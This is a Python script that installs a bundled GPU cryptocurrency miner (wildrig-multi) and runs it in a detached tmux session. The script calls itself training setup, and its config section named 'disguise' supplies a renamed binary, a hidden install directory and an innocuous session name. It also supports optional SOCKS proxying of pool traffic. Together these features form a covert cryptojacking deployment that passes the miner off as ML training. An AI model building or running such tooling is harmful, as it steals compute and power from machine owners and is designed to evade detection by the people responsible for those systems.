#!/usr/bin/env python3
"""Install the bundled GPU miner and launch it in tmux.

Usage:
    python3 train_setup.py
    python3 train_setup.py --check
    python3 train_setup.py -c path.json
"""
import argparse
import json
import os
import shlex
import shutil
import subprocess
import sys
from pathlib import Path

PROJECT_DIR = Path(__file__).resolve().parent
DEFAULT_CONFIG = PROJECT_DIR / "params.json"
TRAINER_DIR = PROJECT_DIR / "src" / "trainer"
PROXY_ENV_KEYS = ("all_proxy", "ALL_PROXY", "http_proxy", "https_proxy",
                  "HTTP_PROXY", "HTTPS_PROXY", "no_proxy", "NO_PROXY")


def load_config(argv):
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("-c", "--config", type=Path, default=DEFAULT_CONFIG)
    parser.add_argument("--check", action="store_true", help="validate without installing or launching")
    args = parser.parse_args(argv[1:])
    return json.loads(args.config.read_text()), args.check


def resolve(cfg):
    """Resolve the local bundle relative to this script, independent of cwd."""
    miner = cfg["miner"]
    app_dir = Path.home() / cfg["disguise"]["app_dir_name"]
    return {
        "use_proxy": cfg.get("useProxy", False),
        "socks": cfg.get("socks", ""),
        "pool_url": cfg["pool"]["url"],
        "wallet": cfg["wallet"]["address"],
        "worker": cfg["wallet"]["worker"],
        "source_dir": TRAINER_DIR,
        "algo": miner["algo"],
        "print_time": miner.get("print_time", 120),
        "temp_limit": miner.get("temp_limit", 78),
        "app_dir": app_dir,
        "bin_dir": app_dir / ".bin",
        "logs_dir": app_dir / "logs",
        "bin_name": cfg["disguise"]["binary_name"],
        "session": cfg["disguise"]["tmux_session"],
        "power_limit": cfg["gpu"].get("power_limit", 0),
    }


def validate(c):
    if type(c["use_proxy"]) is not bool:
        raise ValueError("useProxy must be a JSON boolean (true or false)")
    required = ("pool_url", "wallet", "worker", "algo", "bin_name", "session")
    if c["use_proxy"]:
        required += ("socks",)
    missing = [key for key in required if not isinstance(c[key], str) or not c[key].strip()]
    if missing:
        raise ValueError(f"Set nonempty config values for: {', '.join(missing)}")
    if any(c[key].startswith("YOUR_") for key in ("wallet", "pool_url", "algo")):
        raise ValueError("Set miner.algo, pool.url, and wallet.address before deploying.")
    if c["use_proxy"] and not c["socks"].startswith("socks5://"):
        raise ValueError("socks must look like socks5://[user:pass@]host:port")
    if Path(c["bin_name"]).name != c["bin_name"] or c["bin_name"] in (".", ".."):
        raise ValueError("binary_name must be a filename, without directory components")
    if not (c["source_dir"] / "wildrig-multi").is_file():
        raise ValueError(f"Bundled miner missing: {c['source_dir'] / 'wildrig-multi'}")
    if c["bin_dir"].resolve().is_relative_to(c["source_dir"].resolve()):
        raise ValueError("Install directory must be outside src/trainer")


def sh(*cmd, check=True, **kw):
    return subprocess.run(cmd, check=check, text=True, **kw)


def tunnel_env(socks=None):
    """Apply the selected mode without inheriting a shell's proxy settings."""
    env = {key: value for key, value in os.environ.items() if key not in PROXY_ENV_KEYS}
    if socks is None:
        return env
    return {
        **env,
        "all_proxy": socks, "ALL_PROXY": socks,
        "http_proxy": socks, "https_proxy": socks,
        "HTTP_PROXY": socks, "HTTPS_PROXY": socks,
        "no_proxy": "localhost,127.0.0.1", "NO_PROXY": "localhost,127.0.0.1",
    }


def install(c):
    """Copy the local bundle, including libraries and other runtime assets."""
    c["logs_dir"].mkdir(parents=True, exist_ok=True)
    shutil.copytree(c["source_dir"], c["bin_dir"], dirs_exist_ok=True)
    binary = c["bin_dir"] / "wildrig-multi"
    target = c["bin_dir"] / c["bin_name"]
    if binary != target:
        binary.replace(target)
    target.chmod(0o755)


def write_env_file(c):
    values = {
        "USE_PROXY": "true" if c["use_proxy"] else "false",
        "SOCKS": c["socks"] if c["use_proxy"] else "",
        "POOL": c["pool_url"], "WALLET": c["wallet"],
        "WORKER": c["worker"], "POWER_LIMIT": c["power_limit"],
    }
    path = c["app_dir"] / ".env"
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as stream:
        os.fchmod(stream.fileno(), 0o600)
        stream.write("".join(f"{key}={shlex.quote(str(value))}\n" for key, value in values.items()))


def write_runner(c):
    quote = lambda value: shlex.quote(str(value))
    runner = c["app_dir"] / "run_train.sh"
    lines = [
        "#!/usr/bin/env bash",
        "set -euo pipefail",
        f"source {quote(c['app_dir'] / '.env')}",
        f"cd {quote(c['bin_dir'])}",
        'export LD_LIBRARY_PATH="$PWD:$PWD/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"',
        # tmux can retain proxy variables from an earlier session. Apply the
        # config inside the runner too, including when it is invoked directly.
        "unset " + " ".join(PROXY_ENV_KEYS),
        "proxy_args=()",
        'if [[ "$USE_PROXY" == true ]]; then',
        '    proxy_args=(--proxy "$SOCKS")',
        '    export all_proxy="$SOCKS" ALL_PROXY="$SOCKS"',
        '    export http_proxy="$SOCKS" https_proxy="$SOCKS" HTTP_PROXY="$SOCKS" HTTPS_PROXY="$SOCKS"',
        '    export no_proxy="localhost,127.0.0.1" NO_PROXY="localhost,127.0.0.1"',
        'fi',
        "power_args=()",
        'if [[ "$POWER_LIMIT" != 0 ]]; then power_args=(--gpu-powerlimit "$POWER_LIMIT"); fi',
    ]
    command = [
        f"exec {quote(c['bin_dir'] / c['bin_name'])}",
        f"--algo {quote(c['algo'])}",
        '--url "$POOL"',
        '--user "$WALLET.$WORKER"',
        '"${proxy_args[@]}"',
        "--no-color",
        f"--print-time {quote(c['print_time'])}",
        f"--log-file {quote(c['logs_dir'] / 'session.log')}",
        f"--gpu-temp-limit {quote(c['temp_limit'])}",
        '"${power_args[@]}"',
        '"$@"',
    ]
    runner.write_text("\n".join(lines) + "\n" + " \\\n    ".join(command) + "\n")
    runner.chmod(0o755)


def launch(env, c):
    sh("tmux", "kill-session", "-t", c["session"], check=False, env=env)
    sh("tmux", "new-session", "-d", "-s", c["session"],
       shlex.quote(str(c["app_dir"] / "run_train.sh")), env=env)
    sh("tmux", "ls", env=env)


def main():
    try:
        cfg, check = load_config(sys.argv)
        c = resolve(cfg)
        validate(c)
        if check:
            print(f"Configuration valid. Local miner: {c['source_dir'] / 'wildrig-multi'}")
            return
        if shutil.which("tmux") is None:
            raise ValueError("tmux not found; install it before launching.")
        install(c)
        write_env_file(c)
        write_runner(c)
        launch(tunnel_env(c["socks"] if c["use_proxy"] else None), c)
    except (OSError, ValueError, KeyError, TypeError, subprocess.CalledProcessError) as exc:
        sys.exit(f"Setup failed: {exc}")
    print(f"\nLog:    tail -f {shlex.quote(str(c['logs_dir'] / 'session.log'))}")
    print(f"Attach: tmux attach -t {shlex.quote(c['session'])}")
    print(f"Stop:   tmux kill-session -t {shlex.quote(c['session'])}")


if __name__ == "__main__":
    main()
